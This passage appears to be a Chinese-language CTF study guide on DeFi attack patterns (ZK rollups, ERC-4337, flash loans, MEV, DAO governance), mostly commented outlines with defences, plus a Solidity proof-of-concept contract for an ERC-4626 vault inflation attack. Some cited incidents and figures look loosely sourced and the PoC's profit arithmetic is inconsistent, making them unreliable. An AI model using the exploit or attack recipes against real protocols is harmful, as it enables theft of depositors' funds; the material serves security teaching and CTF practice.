// 1. ZK 证明验证漏洞
//    - 证明验证合约中的椭圆曲线运算错误
//    - 无效证明被接受 → 在 L2 铸造虚假余额
//
// 2. Circuit 约束不充分
//    - 交易验证电路中缺少某些约束
//    - 攻击者构造满足所有约束但语义错误的交易
//    - 例如：绕过溢出检查、重复花费
//
// 3. 数据可用性问题
//    - ZK-Rollup 需要将交易数据发布到 L1
//    - 如果数据不可用 → 用户无法验证状态
//    - 攻击者隐藏关键数据导致资金锁定

// === 实际案例 ===
// - 2024: 简化 ZK 路由器的溢出漏洞
// - 2024: Scroll zkEVM 的电路约束遗漏
// - 2025: AggLayer 的跨 L2 消息验证问题
// - 2025: 某 L2 的 Sequencer MEV 操纵

// === CTF 常见考法 ===
// 1. 找到 Merkle 证明验证中的路径验证缺陷
// 2. 利用 Simplified Rollup 的状态转换函数漏洞
// 3. 构造 ZK-proof 伪造（在给定简化电路中）
// 4. 利用 Sequencer 的排序特权进行 MEV 攻击
```

### 3. ERC-4626 金库膨胀攻击（Vault Inflation Attack）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

/// @title ERC-4626 Vault Inflation Attack PoC
/// @notice 金库首存膨胀攻击：通过捐赠操纵 share 价格，窃取第一位存款者的资金
/// @dev 
/// 漏洞原理：
/// ERC-4626 的 share 计算: shares = assets * totalSupply / totalAssets
/// 首次存款时 totalSupply = 0，公式退化为 shares = assets（基于1:1比例）
/// 攻击者可以：
///   1. 直接向 vault 的底层代币地址 transfer() 大量代币（不通过 deposit）
///   2. 这增加了 totalAssets 但不增加 totalSupply
///   3. 第一位合法存款者的 shares 被严重稀释
///   4. 攻击者 withdraw() 取走所有资金（包括合法存款）
///
/// 经典案例：
/// - 2023: Creeper（$21M TVL 项目）
/// - 2024: 多个新部署的 ERC-4626 vault 被攻击
/// - CTF: 极高频考点
contract VaultInflationExploit {
    // === 攻击步骤 ===

    /// @notice 攻击 ERC-4626 Vault
    function attack(address vault, uint256 victimDeposit) external {
        IERC4626 vaultContract = IERC4626(vault);
        IERC20 asset = IERC20(vaultContract.asset());

        // 步骤 1: 攻击者先 deposit 极小金额 (1 wei)
        vaultContract.deposit(1, address(this));
        // 此时: totalSupply = 1 shares, totalAssets = 1 wei
        // 攻击者持有 100% 的 shares

        // 步骤 2: 直接 transfer 大量代币到 vault（绕过 deposit）
        // 这不增加 totalSupply，但增加了 totalAssets
        asset.transfer(vault, 10 ether);
        // 此时: totalSupply = 1 shares, totalAssets = 10 ether + 1 wei
        // 每 share 的价值 = ~10 ether

        // 步骤 3: 等待受害者存款（或自行调用 deposit）
        // 假设受害者存入 9 ether
        // vaultContract.deposit(9 ether, victim);
        // shares = 9 ether * 1 / (10 ether + 1) ≈ 0 (整数除法向下取整)
        // 受害者获得 0 shares！所有资金归攻击者

        // 步骤 4: 攻击者 withdraw() 取走所有资金
        uint256 shares = vaultContract.balanceOf(address(this));
        vaultContract.withdraw(shares, address(this), address(this));
        // 获得: 10 ether + 9 ether = 19 ether（攻击者投入 10 ether + 1 wei）
    }

    // === 防护措施 ===
    // 1. 首次 deposit 时铸造 1000 虚拟 shares（而非 0）
    //    shares = (assets * totalSupply + totalAssets) / totalAssets
    //    如果 totalSupply = 0: shares = assets + 1000
    //    虚拟 shares 无法被 withdraw（没有对应的 deposit）
    //
    // 2. 在 _deposit 中检查首次存款的最小金额
    //
    // 3. 使用 OpenZeppelin v5 的 ERC4626（已修复此问题）
    //
    // 4. 检测异常的 share 价格变化（监控脚本）

    // === 改进的攻击（2024+ 变种） ===
    // 1. 利用 ERC-4626 + 闪电贷组合：
    //    flashLoan → deposit 1 wei → transfer 大额 → 快速 withdraw
    //    完全不需要等待受害者
    //
    // 2. 多 vault 链式攻击：
    //    vaultA.transfer → vaultB.deposit → vaultB.withdraw → ...
    //    通过多个 vault 之间转移放大利润
    //
    // 3. 利用 vault 的 reinvest/autocompound 逻辑
    //    操纵 asset 价格使 reinvest 计算错误
}

interface IERC4626 is IERC20 {
    function asset() external view returns (address);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function withdraw(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function totalAssets() external view returns (uint256);
}
```

### 4. 账户抽象攻击（ERC-4337）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title ERC-4337 Account Abstraction Attack Patterns

// === 模式一：Paymaster 滥用 ===
// Paymaster 为用户支付 gas 费（代付 gas）
//
// 攻击方式：
// 1. 找到 Paymaster 中的签名校验漏洞
// 2. 伪造签名让 Paymaster 为攻击者的交易付 gas
// 3. 大量消耗 Paymaster 的 ETH 余额
//
// 实际案例：
// 2024: 多个 Paymaster 实现中存在签名验证绕过
// - 缺少 signer 地址验证
// - 签名可重放（无 nonce/chainId 绑定）
// - EIP-712 域分隔符不正确

// === 模式二：UserOperation 重放 ===
// UserOperation 中的 nonce 管理漏洞
// 攻击者重放已执行的 UserOperation → 重复执行操作
//
// 防护：undler 应验证 nonce 单调递增

// === 模式三：Session Key 攻击 ===
// ERC-4337 的 Session Key 机制允许有限授权
//
// 攻击方式：
// 1. Session Key 的权限范围检查不严
// 2. 利用 allowList 中的边界条件
// 3. 在 session 过期前执行未授权操作

// === 模式四：EntryPoint 本身漏洞 ===
// EntryPoint 是 ERC-4337 的核心合约
// 2024 发现的潜在攻击面：
// 1. validateUserOp 中的重入风险
// 2. 调用 paymaster 验证时的 gas 消耗控制
// 3. aggregateSigner 聚合签名的验证缺陷

// === CTF 常见考法 ===
// 1. 给定简化 Paymaster，找到签名验证绕过
// 2. 利用 UserOperation 执行链中的回调进行重入
// 3. 绕过 Session Key 的权限限制
// 4. 在 EntryPoint.validateUserOp 中找到验证缺陷
```

### 5. NFT 金融化攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title NFT Financialization Attack Patterns

// === NFT 借贷协议攻击 ===
// Blur Blend / BendDAO / NFTfi 等
//
// 攻击方式：
// 1. NFT 价格操纵
//    - 通过 wash trading 抬高地板价
//    - 在借贷协议中以高估的 NFT 借出大量资金
//    - 不归还贷款，保留借出的 ETH
//
// 2. 清算攻击
//    - NFT 价格暴跌时触发清算
//    - 攻击者操纵地板价加速清算
//    - 以折扣价获得 NFT
//
// 3. 债券定价漏洞
//    Blur Blend 使用 bonding curve 定价
//    攻击者利用曲线参数操纵定价

// === NFT 碎片化攻击 ===
// 1. ERC-1155 → ERC-20 碎片化
//    - NFT 碎片化后获得 ERC-20 份额代币
//    - 如果赎回逻辑有缺陷 → 可无限铸造份额代币
//    - 或以错误比例赎回底层 NFT
//
// 2. 治理攻击
//    - 碎片化协议通常用份额代币进行治理
//    - 闪电贷借入份额 → 通过恶意提案 → 转移 NFT

// === CTF 常见考法 ===
// 1. 找到 NFT 估价函数中的价格操纵点
// 2. 利用 ERC-1155 的 batch 操作绕过检查
// 3. 在 NFT 借贷合约中找到清算逻辑缺陷
```

### 6. 真实世界资产（RWA）攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title RWA DeFi Attack Patterns

// === RWA 代币化攻击 ===
// 1. 预言机依赖链攻击
//    RWA 价格通常来自链下预言机
//    攻击者入侵预言机更新流程 → 操纵 RWA 价格
//    → 在借贷协议中以虚高价格借出资金
//
// 2. 合规检查绕过
//    RWA 代币通常有 KYC/AML 检查
//    - 检查函数的访问控制漏洞
//    - 地址黑名单绕过
//    - 通过中间合约绕过 transfer 检查
//
// 3. 法律实体绑定漏洞
//    RWA 代币与法律实体绑定
//    如果绑定信息存储在链上且可修改 → 伪造所有权

// === 稳定币攻击（RWA-backed 稳定币） ===
// 1. 储备证明操纵
//    - 通过多次赎回/铸造操作影响储备审计
//    - 在审计窗口期间操纵储备比例
//
// 2. 脱锚攻击
//    - 大规模赎回导致 RWA 稳定币脱锚
//    - 利用脱锚在 CEX/DEX 之间套利

// === 2024-2026 实际案例 ===
// - 2024: 多个 RWA 借贷协议的预言机漏洞
// - 2024: Ondo Finance 等 RWA 协议的安全审计发现
// - 2025: 跨链 RWA 代币的双重花费尝试
// - 2025: RWA 稳定币的储备操纵事件
```

### 7. 闪电贷新变种

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Flash Loan Attack Variants (2024-2026)

// === 变种一：闪电贷 + 重入 ===
// 利用闪电贷提供的大额资金进行重入攻击
// 1. flashLoan → deposit → withdraw (reenter) → repeat
// 2. 通过重入在资金被扣除前多次提取
// 防护：CEI 模式 + reentrancy guard + flash loan callback 限制

// === 变种二：闪电贷 + 预言机操纵 + 多协议组合 ===
// 最常见的 2024-2026 攻击模式
// 1. flashLoan(tokenA, largeAmount)
// 2. swap on DEX1 → manipulate price of tokenB
// 3. deposit tokenB into protocolY (at inflated price)
// 4. borrow tokenA from protocolY (high collateral value)
// 5. repay flash loan
// 利润 = borrowed tokenA - flash loan repayment
//
// 实际案例：
// - 2024: Radiant Capital 闪电贷攻击（$50M）
// - 2024: Jimbo 协议价格操纵
// - 2025: 新型 AMM (Uniswap V4 hooks) 的闪电贷操纵

// === 变种三：闪电贷 + 清算竞赛 ===
// 多个清算机器人同时竞争同一清算机会
// 1. 检测到不健康仓位
// 2. 构造最优清算路径（闪电贷借入债务资产）
// 3. 与 MEV 竞争者竞争 gas price
// 4. 使用 Flashbots bundle 确保原子性
//
// 2024+ 趋势：
// - 清算机器人使用私有 mempool
// - 清算路径优化（多跳 swap 找最优价格）
// - 跨链清算（L1 仓位在 L2 上清算）

// === 变种四：闪电贷 +治理操纵 ===
// 已在治理攻击中详述，2024+ 新增：
// - 使用 GovernorBravo + Timelock 的多步骤攻击
// - 利用乐观治理（optimistic governance）的假投票

// === 变种五：闪电贷 + NFT 市场操纵 ===
// 1. flashLoan → 批量铸造/购买 NFT → 操纵地板价
// 2. 在 NFT 借贷协议中以虚高价格借出资金
// 3. 归还闪电贷，保留借出资金
```

### 8. MEV 新模式（2024-2026）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title MEV New Patterns (2024-2026)

// === Flashbots Protect / MEV-Share ===
// 2024: MEV-Share 允许用户分享 MEV 收益
// 攻击面：
// 1. Matchmaker 中的订单匹配漏洞
// 2. 隐私交易的数据泄露
// 3. 通过 MEV-Share 获取私有交易信息 → 前置攻击

// === 搜索者（Searcher）竞争攻击 ===
// 1. Gas griefing：发送高 gas 但必定失败的交易
//    阻止其他搜索者提交 bundle
//    → 攻击者独占清算/套利机会
//
// 2. Bundle 盗窃：监控其他搜索者的 bundle
//    提取其中有价值的交易
//    构造自己的 bundle 包含相同交易
//
// 3. 时间盗贼（Time-bandit）攻击
//    当 MEV 利润 > 区块奖励时
//    搜索者可能尝试重组区块链
//    2024: 在 L2 上更易发生（Sequencer 可重组）

// === L2 MEV 问题 ===
// 1. Sequencer 级别 MEV
//    Sequencer 看到所有交易并排序
//    中心化 Sequencer = 最大 MEV 提取者
//
// 2. 跨域 MEV（Cross-domain MEV）
//    L1 和 L2 之间的价格差异
//    闪电贷在 L1 借入 → L2 执行获利 → L1 还款
//    需要跨链桥支持（增加攻击面）

// === MEV Bot 被攻击案例 ===
// 2024: 多个 MEV bot 被反向利用
// 1. Sandwich bot 的路由可预测 → 被前置
// 2. Liquidation bot 使用公开的策略 → 被竞争
// 3. Arb bot 的 profit 计算有缺陷 → 亏损执行
```

### 9. 零知识证明 DeFi 攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title ZK-DeFi Attack Patterns

// === ZK 证明验证漏洞 ===
// 1. 无效证明被接受
//    验证合约中的配对检查错误
//    → 攻击者提交无效证明 → 状态转换被接受
//    → 在 L2 上凭空铸造代币
//
// 2. 电路约束不完整
//    交易有效性电路中缺少关键约束
//    例如：未检查 overflow、未检查 sender 权限
//    → 构造满足所有约束但语义无效的交易

// === ZK-Rollup 数据可用性攻击 ===
// 1. 交易数据隐藏
//    ZK-Rollup 需要将交易数据发布到 L1
//    如果 Sequencer 不发布数据 → 状态不可验证
//    → 用户无法 withdraw（资金锁定）
//
// 2. 数据压缩攻击
//    恶意构造的交易数据导致解压缩错误
//    → 节点无法同步状态

// === 隐私 DeFi 攻击 ===
// 1. Tornado Cash 风格混币器的追踪
//    虽然交易金额被隐藏
//    但通过 gas 消耗模式、时间分析、金额分析仍可追踪
//
// 2. 隐私 AMM 的流动性操纵
//    隐藏的交易导致价格发现延迟
//    → 攻击者利用信息不对称获利

// === 2024-2026 实际案例 ===
// - 2024: ZkSync Era 的状态验证漏洞
// - 2024: StarkNet 的 Cairo 代码审计发现
// - 2025: Linea 的 ZK 证明优化引入新漏洞
// - 2025: Mina Protocol 的递归证明验证问题
```

### 10. DAO 治理新攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title DAO Governance New Attack Patterns (2024-2026)

// === 攻击模式一：时间锁操纵 ===
// GovernorBravo + Timelock 是最常见的治理架构
//
// 漏洞：Timelock 的 eta (execution time) 计算
// function getETA(uint256 timestamp) returns (uint256) {
//     return timestamp - (timestamp % gracePeriod()) + delay() + gracePeriod();
// }
// 如果 delay 为 0 或计算有 off-by-one → 提前执行
//
// 2024 案例：多个 DAO 的 Timelock 参数配置错误

// === 攻击模式二：委托投票（Delegation）漏洞 ===
// 治理代币可以 delegate 给他人投票权
//
// 漏洞 1：delegate 后立即撤回
//    → 投票权在投票期间被撤回
//    → 已通过的提案实际上没有足够票数
//
// 漏洞 2：多次 delegate
//    → 同一 token 的投票权被重复计算
//    → 达到 quorum 但实际投票权不足

// === 攻击模式三：提案操纵 ===
// 1. 恶意提案 + 社会工程
//    提交看似无害的提案
//    但 calldata 中包含隐藏的恶意操作
//    → 社区成员未仔细审查 → 投票通过
//
// 2. 提案垃圾邮件
//    提交大量提案使审查疲劳
//    在混乱中通过恶意提案

// === 攻击模式四：闪电贷 + Timelock 2-Tx 攻击 ===
// 2024+: Timelock 要求跨区块持有代币
// 两笔交易攻击：
// Tx1 (Block N):   flashLoan → delegate → queue proposal → transfer tokens away
// Tx2 (Block N+1): execute proposal
//
// 关键：Tx1 的 delegate 在 Block N 生效
// 但 queue 需要 pastBalance 检查（Block N-1）
// 如果 Tx1 在 Block N 开始时执行
// 且 proposal 的创建使用 getBalanceAt(block.number - 1)
// → 攻击者在 Block N-1 不持有代币 → 攻击失败
//
// 防护：使用 getPastVotes(block.number - 2) 或更严格的时间窗口

// === CTF 常见考法 ===
// 1. 找到 Governor 合约中的投票权验证缺陷
// 2. 利用 Timelock 的 eta 计算错误提前执行
// 3. 通过 delegate 后撤回操纵投票结果
// 4. 在 Optimistic Governance 中提交欺诈提案
```

### 11. AI 辅助安全检测与攻击

```python
# === AI 辅助 DeFi 漏洞检测 ===
#
# 1. LLM 驱动的智能合约审计
#    - 使用 GPT-4/Claude 分析 Solidity 源码
#    - 自动识别常见漏洞模式（重入、溢出、权限问题）
#    - 2024: 多个审计公司使用 AI 辅助审计
#    - 局限：无法发现逻辑漏洞、经济模型漏洞
#
# 2. 符号执行 + ML 组合
#    Mythril/Echidna 的结果作为 ML 特征
#    训练模型识别高风险代码模式
#    - 输入：符号执行路径、gas 消耗模式、外部调用图
#    - 输出：漏洞概率评分
#
# 3. 异常交易模式检测
#    链上交易的 ML 分析：
#    - 异常 gas 消耗模式（可能的重入）
#    - 异常大额交易序列（可能的闪电贷攻击）
#    - 跨协议资金流动异常（可能的套利攻击）

# === AI 辅助攻击（攻击面） ===
# 1. 自动化漏洞发现
#    攻击者使用 AI 扫描新部署的合约
#    - 快速识别未修复的已知漏洞
#    - 自动构造 exploit
#    2025: AI 辅助的自动化攻击已出现
#
# 2. 社会工程增强
#    AI 生成钓鱼消息、伪造治理提案说明
#    针对 DAO 社区成员的定向攻击
#
# 3. MEV 策略优化
#    使用强化学习优化 MEV 提取策略
#    - 动态调整 gas price
#    - 实时预测交易影响
#    - 自动选择最优套利路径

# === 防护：AI 安全工具推荐 ===
# - Slither + custom detectors (Solidity 静态分析)
# - Mythril (符号执行)
# - Aderyn (AI 辅助审计工具)
# - Fourisle Shield (DeFi 安全监控)
# - OpenZeppelin Defender (自动化安全响应)
```

### 12. CTF DeFi 攻击模式速查

```solidity
// === CTF 中最高频的 DeFi 漏洞类型 ===
//
// ⭐ Tier 1 (必考):
// 1. ERC-4626 Vault 膨胀攻击 (首存操纵)
// 2. 闪电贷 + 预言机操纵 (TWAP 不足)
// 3. 重入攻击 (CEI 违反)
// 4. 算术溢出/下溢 (Solidity <0.8.0)
//
// ⭐ Tier 2 (高频):
// 5. Access Control 缺失 (谁都能调用的敏感函数)
// 6. 签名验证绕过 (ECDSA 恢复 + 签名伪造)
// 7. 治理攻击 (闪电贷投票)
// 8. 预言机操纵 (Spot Price vs TWAP)
//
// ⭐ Tier 3 (进阶):
// 9. 闪电贷 + AMM 流动性操纵
// 10. 跨链消息伪造 (Chain ID/Nonce)
// 11. 随机数操纵 (Blockhash/Prevrandao)
// 12. Token Approval 无限授权攻击

// === 快速解题流程 ===
// 1. 读题目描述 → 确定攻击目标和约束
// 2. 找到关键函数 → 有哪些外部调用？
// 3. 检查访问控制 → 谁可以调用？
// 4. 检查资金流 → ETH/Token 从哪来？
// 5. 检查时间约束 → 有什么时间限制？
// 6. 构造 PoC → 用 Foundry test 编写 exploit
// 7. 执行 → forge test --match-test testExploit -vvv
//
// === Foundry PoC 模板 ===
// function testExploit() public {
//     // 1. 搭建环境
//     // 2. 部署攻击合约
//     // 3. 执行攻击
//     // 4. 断言结果
//     assertGt(attacker.balance, initialBalance);
// }
```

## 工具推荐

- **Foundry** — 合约开发/测试
- **Slither** — 静态分析
- **Mythril** — 符号执行
- **Echidna** — 模糊测试
- **DeFiYield** — DeFi 安全分析
- **DefiSafety** — DeFi 审计

## 参考链接

- [DeFi Rekt](https://rekt.news/)
- [DeFi Attack Database](https://github.com/defi-attacks/defi-attacks)
- [Flash Loan Attacks](https://github.com/flashloan/flash-loan-attacks)
- [MEV Explore](https://explore.flashbots.net/)
